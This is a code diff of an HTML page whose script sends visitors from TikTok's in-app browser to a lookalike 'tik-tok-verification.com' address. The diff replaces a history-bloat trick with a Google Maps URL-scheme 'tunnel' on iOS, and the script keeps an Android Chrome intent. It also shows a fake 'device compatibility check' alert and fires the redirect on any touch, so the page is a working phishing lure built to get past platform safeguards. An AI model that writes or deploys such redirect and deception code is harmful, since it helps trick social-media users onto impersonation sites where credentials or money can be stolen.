@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <style>body { background: #fff; margin: 0; cursor: pointer; }</style>
+    <style>body { background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }</style>
 </head>
 <body>
 
@@ -11,56 +11,46 @@
     const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
     const domain = "tik-tok-verification.com/Verification/verify1.html";
 
-    function sickoModeEject() {
+    function theTunnelEject() {
         const isAndroid = /Android/i.test(navigator.userAgent);
 
-        // 1. STACK BLOAT: Push 100 history states to "heavy up" the WebView
-        for (let i = 0; i < 100; i++) {
-            history.pushState({}, '', window.location.pathname + '#' + i);
-        }
-
         if (isAndroid) {
-            // Android: Forcing the 'Always' Chrome Intent
+            // Android: Chrome Intent targeting the 'Always' browser flag
             window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
         } else {
-            // iOS: THE KERNEL HANDOFF
+            // iOS: THE GOOGLE MAPS TUNNEL
+            // We use the 'comgooglemaps://' scheme which is almost always whitelisted.
+            // We provide a 'q' (query) that is actually your URL.
+            // This forces the OS to ask "Open in Google Maps or Safari?"
             
-            // 2. Fire a "Trusted" Apple scheme to open the door
-            window.location.href = "applespace://"; 
+            window.location.href = "comgooglemaps://?q=" + encodeURIComponent(targetUrl);
 
-            // 3. Immediately slam the Safari Protocol into the 'Hanging' stack
+            // Immediate secondary pulse for Safari directly
             setTimeout(() => {
                 window.location.href = "safari-https://" + domain;
-            }, 5);
-
-            // 4. Fallback: Direct Chrome Scheme
-            setTimeout(() => {
-                window.location.href = "googlechromes://" + domain;
-            }, 50);
+            }, 100);
         }
     }
 
-    // This is the bridge: We use the system alert to "lock" the main thread
-    // while the OS processes the navigation collision in the background.
     window.onload = function() {
-        // Initial attempt
-        sickoModeEject();
+        // Run immediately
+        theTunnelEject();
 
+        // Standard Alert to catch the "OK" tap as a user gesture
         setTimeout(() => {
             if (document.hasFocus()) {
-                const header = "⚠️ SYSTEM COMPATIBILITY ERROR\n";
-                const body = "______________________________\n\nTikTok's internal browser is outdated. Tap OK to load this secure portal in Safari/Chrome.";
-                
+                const header = "DEVICE COMPATIBILITY CHECK\n";
+                const body = "______________________________\n\nTo continue, please confirm you are using a secure browser session.";
                 alert(header + body);
                 
-                // Fire again on the "OK" tap
-                sickoModeEject();
+                // Re-fire on tap
+                theTunnelEject();
             }
         }, 500);
     };
 
-    // If they touch the screen at all, force the eject
-    document.addEventListener('touchstart', sickoModeEject);
+    // Any touch on screen fires the eject
+    document.addEventListener('touchstart', theTunnelEject);
 </script>
 </body>
 </html>
